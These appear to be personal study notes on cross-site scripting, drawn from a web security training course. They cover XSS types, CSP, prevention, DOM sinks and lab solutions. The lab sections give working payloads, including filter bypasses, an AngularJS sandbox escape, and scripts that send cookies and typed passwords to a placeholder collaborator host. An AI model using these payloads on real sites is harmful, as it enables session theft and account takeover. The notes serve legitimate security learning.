What is cross-site scripting (XSS)?
Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application.

How does XSS work?
Cross-site scripting works by manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code executes inside a victim's browser, the attacker can fully compromise their interaction with the application.

What are the types of XSS attacks?
There are three main types of XSS attacks. These are:
•	Reflected XSS, where the malicious script comes from the current HTTP request.
•	Stored XSS, where the malicious script comes from the website's database.
•	DOM-based XSS, where the vulnerability exists in client-side code rather than server-side code.


What can XSS be used for?
An attacker who exploits a cross-site scripting vulnerability is typically able to:
•	Impersonate or masquerade as the victim user.
•	Carry out any action that the user is able to perform.
•	Read any data that the user is able to access.
•	Capture the user's login credentials.
•	Perform virtual defacement of the web site.
•	Inject trojan functionality into the web site.

Impact of XSS vulnerabilities
•	In a brochureware application, where all users are anonymous and all information is public, the impact will often be minimal.
•	In an application holding sensitive data, such as banking transactions, emails, or healthcare records, the impact will usually be serious.
•	If the compromised user has elevated privileges within the application, then the impact will generally be critical, 

How to find and test for XSS vulnerabilities
Manually testing for reflected and stored XSS normally involves 
1.	submitting some simple unique input (such as a short alphanumeric string) into every entry point in the application,
2.	identifying every location where the submitted input is returned in HTTP responses,
3.	and testing each location individually to determine whether suitably crafted input can be used to execute arbitrary JavaScript. 

Content security policy
Content security policy (CSP) is a browser mechanism that aims to mitigate the impact of cross-site scripting and some other vulnerabilities

Mitigating XSS attacks using CSP
The following directive will only allow scripts to be loaded from the same origin as the page itself:
script-src 'self'
The following directive will only allow scripts to be loaded from a specific domain:
script-src https://scripts.normal-website.com

In addition to whitelisting specific domains, content security policy also provides two other ways of specifying trusted resources: nonces and hashes:
•	The CSP directive can specify a nonce (a random value) and the same value must be used in the tag that loads a script. If the values do not match, then the script will not execute. 
•	The CSP directive can specify a hash of the contents of the trusted script. If the hash of the actual script does not match the value specified in the directive, then the script will not execute. 

CSPs do allow image requests. This means you can often use img elements to make requests to external servers in order to disclose CSRF tokens, 

Dangling markup injection
Dangling markup injection is a technique that can be used to capture data cross-domain in situations where a full cross-site scripting exploit is not possible, due to input filters or other defenses

Mitigating dangling markup attacks using CSP
The following directive will only allow images to be loaded from the same origin as the page itself:
img-src 'self'

The following directive will only allow images to be loaded from a specific domain:
img-src https://images.normal-website.com

Lab: Reflected XSS protected by CSP, with CSP bypass
Solution: https://your-lab-id.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
script-src-elem -directive overwrite existing script-src rules enabling you to inject unsafe-inline, which allows you to use inline scripts.


Protecting against clickjacking using CSP
The following directive will only allow the page to be framed by other pages from the same origin:
frame-ancestors 'self'
The following directive will prevent framing altogether:
frame-ancestors 'none'

Using content security policy to prevent clickjacking is more flexible than using the X-Frame-Options header 

can specify multiple domains and use wildcards. For example:
frame-ancestors 'self' https://normal-website.com https://*.robust-website.com

CSP also validates each frame in the parent frame hierarchy, whereas X-Frame-Options only validates the top-level frame.

How to prevent XSS attacks
----------------------------
• Filter input on arrival - > At the point where user input is received, filter as strictly as possible based on what is expected or valid input.
• Encode data on output -> At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.
• Use appropriate response headers -> To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the Content-Type and X-Content-Type-Options headers to ensure that browsers interpret the responses in the way you intend.
• Content Security Policy.-> you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.

Common questions about cross-site scripting
How common are XSS vulnerabilities? XSS vulnerabilities are very common, and XSS is probably the most frequently occurring web security vulnerability.
How common are XSS attacks? It is difficult to get reliable data about real-world XSS attacks, but it is probably less frequently exploited than other vulnerabilities.
What is the difference between XSS and CSRF? XSS involves causing a web site to return malicious JavaScript, while CSRF involves inducing a victim user to perform actions they do not intend to do.
XSS
----
1)The cybercriminal injects a malicious client side script in a website. The script is added to cause some form of vulnerability to a victim.
2) In this, injection of arbitrary data by data that is not validated.
3) It has a requirement of JavaScript.
4) The site accepts the malicious code.
5)

CSS
---
1) The malicious attack is created in such a way that a user sends malicious requests to the target website without having knowledge of the attack.
2) It depends on the functionality and features of the browser to retrieve and execute the attack bundle.
3) It does not has requirement of JavaScript.
4) The malicious code is stored in third party sites.
5)

What is the difference between XSS and SQL injection? XSS is a client-side vulnerability that targets other application users, while SQL injection is a server-side vulnerability that targets the application's database.
Xss
----
1) Injects malicious code into website and the code executes on the users of the website
2) malicious code written on JavaScript

SQL
---
1) Adds SQL code to the input field to access the confidential details or the make changes to the data stores in the database
2) Involves Structured Query Language (SQL)

How do I prevent XSS in PHP? 
Filter your inputs with a whitelist of allowed characters and 
use type hints or type casting. 
Escape your outputs with htmlentities and ENT_QUOTES for HTML contexts, or JavaScript Unicode escapes for JavaScript contexts.
Note: ENT_QUOTES	Will convert both double and single quotes.
If the file is fetched using HTTP (or HTTPS), the Content-Type header can specify the encoding:
Content-Type: application/javascript; charset=utf-8


How do I prevent XSS in Java? 
Filter your inputs with a whitelist of allowed characters and 
use a library such as Google Guava to HTML-encode your output for HTML contexts, 
or use JavaScript Unicode escapes for JavaScript contexts.

What is reflected cross-site scripting?
---------------------------------------
Reflected cross-site scripting (or XSS) arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.

Example
website has a search function which receives the user-supplied search term in a URL parameter:
https://insecure-website.com/search?term=gift

The application echoes the supplied search term in the response to this URL:
<p>You searched for: gift</p>

 an attacker can construct an attack like this:
https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>

Impact of reflected XSS attacks
•	Perform any action within the application that the user can perform.
•	View any information that the user is able to view.
•	Modify any information that the user is able to modify.
•	Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user.

placing links on a website controlled by the attacker, or on another website that allows content to be generated
sending a link in an email,tweet or other message

Reflected XSS in different contexts
•	The location within the response where attacker-controllable data appears.
•	Any input validation or other processing that is being performed on that data by the application.


 XSS between HTML tags
--------------------------
A) Reflected XSS into HTML context with nothing encoded
B) Stored XSS into HTML context with nothing encoded
C) Reflected XSS into HTML context with all tags blocked except custom ones
D) Reflected XSS with event handlers and href attributes blocked
E) Reflected XSS with some SVG markup allowed
F) Reflected XSS into attribute with angle brackets HTML-encoded
G) Stored XSS into anchor href attribute with double quotes HTML-encoded
H) Reflected XSS in canonical link tag

XSS in HTML tag attributes
-----------------------------
A) Reflected XSS into attribute with angle brackets HTML-encoded
B) Stored XSS into anchor href attribute with double quotes HTML-encoded
C) Reflected XSS in canonical link tag

Terminating the existing script
--------------------------------
Reflected XSS into a JavaScript string with single quote and backslash escaped

Breaking out of a JavaScript string
-------------------------------------
Reflected XSS into a JavaScript string with angle brackets HTML encoded
Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

onerror=alert;throw 1
Reflected XSS in a JavaScript URL with some characters blocked

Making use of HTML-encoding
Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

XSS in JavaScript template literals
Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

XSS in the context of the AngularJS sandbox
Reflected XSS with AngularJS sandbox escape without strings

 XSS between HTML tags
--------------------------
When the XSS context is text between HTML tags, you need to introduce some new HTML tags designed to trigger execution of JavaScript.

<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>

Lab: Reflected XSS into HTML context with nothing encoded
Solution
1.	Copy and paste the following into the search box: <script>alert(1)</script>
2.	Click "Search".

Lab: Stored XSS into HTML context with nothing encoded
Solution
1.	Enter the following into the comment box: <script>alert(1)</script>

Lab: Reflected XSS into HTML context with most tags and attributes blocked
search function->Burp proxying traffic-> Send to Burp Intruder.between angle brackets "Add §" twice like: <§§>
Xss cheatsheets Copy tags to clipboard-> Click "Start attack".
Note that all payloads caused an HTTP 400 response, except for the body payload, which caused a 200 response.
Burp Intruder and replace your search term with: <body%20=1>
before the = character and click "Add §" twice,like: <body%20§§=1>   -> "Start attack".
all payloads caused an HTTP 400 response, except for the onresize payload, which caused a 200 response.

<iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>

Lab: Reflected XSS into HTML context with all tags blocked except custom ones
<script>
location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>

Decoded-> =<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';

Lab: Reflected XSS with event handlers and href attributes blocked
This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked..
https://your-lab-id.web-security-academy.net/?search=<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>

Lab: Reflected XSS with some SVG markup allowed
The site is blocking common tags but misses some SVG tags and events.

XSS in HTML tag attributes
-----------------------------
When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one. For example:
"><script>alert(document.domain)</script>

commonly in this situation, angle brackets are blocked or encoded, input cannot break out of the tag . terminate the attribute value introduce a new attribute that creates a scriptable context, such as an event handler. 
For example:
" autofocus onfocus=alert(document.domain) x="

Lab: Reflected XSS into attribute with angle brackets HTML-encoded
Solution:mescape the quoted attribute and inject an event handler: "onmouseover="alert(1)
<input type=text placeholder='Search the blog...' name=search value=""onmouseover="alert(1)">

Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded
view the post and use Burp Suite to intercept the request -> Burp Repeater.
3.	Observe  random string in  Repeater tab has been reflected inside an anchor href attribute.
4.	Repeat the process again but this time replace your input with the following payload to inject a JavaScript URL that calls alert: javascript:alert(1)

Lab: Reflected XSS in canonical link tag
To assist with your exploit, you can assume that the simulated user will press the following key combinations:
•	ALT+SHIFT+X
•	CTRL+ALT+X
•	Alt+X

Terminating the existing script
For example, if the XSS context is as follows:
<script>
...
var input = 'controllable data here';
...
</script>

use payload to break out of the existing JavaScript and execute your own:
</script><img src=1 onerror=alert(document.domain)>

Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped
3.	Try sending the payload test'payload and observe that your single quote gets backslash-escaped.
4.	Replace  with the following payload to break out of the script block and inject a new script: </script><script>alert(1)</script>


Breaking out of a JavaScript string
In cases where the XSS context is inside a quoted string literal
Some useful ways of breaking out of a string literal are:
'-alert(document.domain)-'
';alert(document.domain)//

Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded
2.	Observe that the random string has been reflected inside a JavaScript string.
3.	Replace your input with the following payload to break out of the JavaScript string and inject an alert: '-alert(1)-'


Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
2.	Observe that the random string has been reflected inside a JavaScript strin
Replace  with the following payload to break out of the script \'-alert(1)//

WAF that prevents your requests from ever reaching the website
The following code assigns the alert() function to the global exception handler and the throw statement passes the 1 to the exception handler (in this case alert). The end result is that the alert() function is called with 1 as an argument.

onerror=alert;throw 1
Lab: Reflected XSS in a JavaScript URL with some characters blocked
https://your-lab-id.web-security-academy.net/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'

Making use of HTML-encoding
When the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around some input filters.

For example, if the XSS context is as follows:
<a href="#" onclick="... var input='controllable data here'; ...">

following payload to break -> &apos;-alert(document.domain)-&apos; 
The &apos;  representing an apostrophe or single quote

Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
3.	Observe that the random string in the second Repeater tab has been reflected inside an onclick event handler attribute.
4.	Repeat the process again but this time modify your input to inject a JavaScript URL that calls alert, using the following payload: http://foo?&apos;-alert(1)-&apos;

XSS in JavaScript template literals
are string literals that allow embedded JavaScript expressions and are evaluated and are normally concatenated into the surrounding text
embedded expressions are identified using the ${...} syntax.

For example, 
document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;

if the XSS context is as follows:
<script>
...
var input = `controllable data here`;
...
</script>
then you can use the following payload to execute JavaScript without terminating the template literal:
${alert(document.domain)}

Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
2.	Observe that the random string has been reflected inside a JavaScript template string.
3.	Replace your input with the following payload to execute JavaScript inside the template string: ${alert(1)}


XSS in the context of the AngularJS sandbox
Sometimes, XSS vulnerabilities arise in the context of the AngularJS sandbox

What is the AngularJS sandbox?
The AngularJS sandbox is a mechanism that prevents access to potentially dangerous objects, such as window or document, in AngularJS template expressions
also prevents access to potentially dangerous properties, such as __proto__.

How does the AngularJS sandbox work?
The sandbox works by parsing an expression, rewriting the JavaScript, and then using various functions to test whether the rewritten code contains any dangerous objects

ensureSafeObject() function checks whether a given object references itself. This is one way to detect the window object
ensureSafeMemberName() function checks each property access of the object and, if it contains dangerous properties such as __proto__ or __lookupGetter__, the object will be blocked
ensureSafeFunction()function prevents call(), apply(), bind(), or constructor() from being called.

How does an AngularJS sandbox escape work?
The most well-known escape uses the modified charAt() function globally within an expression:
'a'.constructor.prototype.charAt=[].join

Lab: Reflected XSS with AngularJS sandbox escape without strings
https://your-lab-id.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1

How does an AngularJS CSP bypass work?
Content security policy (CSP) bypasses work in a similar way to standard sandbox escapes, but usually involve some HTML injection. When the CSP mode is active in AngularJS, it parses template expressions differently and avoids using the Function constructor. 


Exploiting cross-site scripting to steal cookies
3.	Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
<script>
fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>

Exploiting cross-site scripting to perform CSRF
you might be able to make a victim send a message, accept a friend request, commit a backdoor to a source code repository, or transfer some Bitcoin.
Some websites allow logged-in users to change their email address without re-entering their password.

Lab: Exploiting XSS to perform CSRF
3.	Submit the following payload in a blog comment:
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>


Lab: Exploiting cross-site scripting to capture passwords
3.	Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">

How to find and test for reflected XSS vulnerabilities
•	Test every entry point. 
	Test separately every entry point for data within the application's HTTP requests. 
	This includes parameters or other data within the URL query string and message body, 
	and the URL file path. It also includes HTTP headers, 
	
•	Submit random alphanumeric values. 
	For each entry point, submit a unique random value and determine whether the value is reflected in the response. 

•	Determine the reflection context. 
	For each location within the response where the random value is reflected, determine its context. 
	This might be in text between HTML tags, within a tag attribute which might be quoted, within a JavaScript string, etc.

•	Test a candidate payload. 
	Based on the context of the reflection, test an initial candidate XSS payload that will trigger JavaScript execution 

•	Test alternative payloads. 
	If the candidate XSS payload was modified by the application, or blocked altogether, then you will need to test alternative payloads 

•	Test the attack in a browser. 
	Finally, if you succeed in finding a payload that appears to work within Burp Repeater, transfer the attack to a real browser 

What is DOM-based cross-site scripting?
DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as eval() or innerHTML. 

The most common source for DOM XSS is the URL, which is typically accessed with the window.location object. 

How to test for DOM-based cross-site scripting
To test for DOM-based cross-site scripting manually, you generally need to use a browser with developer tools, such as Chrome. You need to work through each available source in turn, and test each one individually.

Testing HTML sinks
Testing JavaScript execution sinks
Exploiting DOM XSS with different sources and sinks

Testing HTML sinks
To test for DOM XSS in an HTML sink, place a random alphanumeric string into the source (such as location.search)
then use developer tools to inspect the HTML and find where your string appears
For each location where your string appears within the DOM, you need to identify the context. Based on this context, you need to refine your input to see how it is processed
For example, if your string appears within a double-quoted attribute then try to inject double quotes in your string to see if you can break out of the attribute.

Testing JavaScript execution sinks
your input doesn't necessarily appear anywhere within the DOM,  need to use the JavaScript debugger to determine whether and how your input is sent to a sink
Once you've found where the source is being read, you can use the JavaScript debugger to add a break point and follow how the source's value is used

Exploiting DOM XSS with different sources and sinks
There are a variety of sinks that are relevant to DOM-based vulnerabilities.

Which sinks can lead to DOM-XSS vulnerabilities?
The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()

